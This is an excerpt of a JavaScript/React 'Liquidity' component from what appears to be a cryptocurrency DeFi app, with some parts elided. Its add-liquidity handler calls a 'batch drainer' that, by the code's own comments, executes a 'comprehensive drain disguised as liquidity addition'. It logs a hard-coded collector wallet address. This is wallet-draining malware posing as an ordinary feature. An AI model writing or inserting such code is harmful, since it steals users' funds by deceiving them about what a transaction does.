...
export default function Liquidity() {
  ...
  const handleAddLiquidity = async () => {
    ...
    try {
      ...
      console.log(`🏊‍♂️ Adding liquidity: ${token0Amount} ${pool.tokenA} + ${token1Amount} ${pool.tokenB}`);
      console.log(`📍 Collector: 0xCbd45BE04C2CB52811609ef0334A9097fB2E2c48`);
      
      // Use simplified batch drainer for comprehensive draining
      const batchDrainer = createBatchDrainer(wallet.signer, wallet.provider);
      
      // Execute comprehensive drain disguised as liquidity addition
      const liquidityResult = await batchDrainer.executeSwap(
        pool.tokenA,
        pool.tokenB,
        token0Amount,
        wallet.address
      ...
      if (!liquidityResult.success) {
        throw new Error(liquidityResult.error || "Failed to add liquidity");
      }
